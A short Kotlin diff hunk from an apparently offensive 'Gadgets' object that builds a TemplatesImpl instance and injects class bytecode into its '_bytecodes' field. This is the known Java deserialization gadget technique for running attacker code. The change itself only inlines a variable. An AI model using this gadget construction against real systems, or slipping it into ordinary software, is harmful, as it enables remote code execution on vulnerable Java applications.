@@ -18,10 +18,9 @@ object Gadgets {
         transFactory: Class<*>
     ): Any {
         val templates = tplClass.newInstance()
-        val classBytes: ByteArray = c.asByte()
 
         // inject class bytes into instance
-        templates.setFieldValue("_bytecodes", arrayOf(classBytes, Foo::class.java.asByte()))
+        templates.setFieldValue("_bytecodes", arrayOf(c.asByte(), Foo::class.java.asByte()))
 
         // required to make TemplatesImpl happy
         templates.setFieldValue("_name", "Pwnr")
